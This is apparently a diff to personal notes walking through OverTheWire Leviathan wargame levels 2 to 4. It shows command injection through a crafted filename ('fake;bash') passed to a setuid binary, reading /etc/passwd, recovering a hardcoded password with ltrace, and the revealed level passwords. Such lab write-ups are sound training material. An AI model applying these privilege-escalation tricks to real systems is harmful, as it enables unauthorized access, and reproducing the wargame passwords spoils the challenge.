@@ -22,7 +22,7 @@ ls
 ./printfile
 ./printfile /etc/passwd // it prints out the whole file
 ls -l // answer : -r-sr-x--- 1 leviathan3 leviathan2 7436 Oct 29 21:17 printfile, the s means it is owned by leviathan3
-// the highligt over printfile meeans that it is a binary, running it allows us to benefit from the previledges that lev3 has. Previledge elevation in other words.
+// the highligt over printfile meeans that it is a setuid binary, running it allows us to benefit from the previledges that lev3 has. Previledge elevation in other words.
 ./printfile /etc/leviathan_pass/leviathan3 // You cant have that file...
 mktemp -d
 cd /tmp/tmp.Q7WF3s2Lxd
@@ -30,3 +30,18 @@ touch 'fake;bash'
 // Curiously we became leviathan3@leviathan:/tmp/tmp.Q7WF3s2Lxd$
 cat /etc/leviathan_pass/leviathan3
 Ahdiemoo1j
+
+lvl 3 --> lvl 4
+ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+ls 
+./level3
+ls -l // it is a setuid binary
+strings ./level3 | less // to see the content
+ltrace ./level3 // strcmp("h0no33", "kakaka")  
+// we get strcmp("kakaka\n", "snlprintf\n")  
+./level3
+snlprintf
+cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+
+lvl 4 --> lvl 5
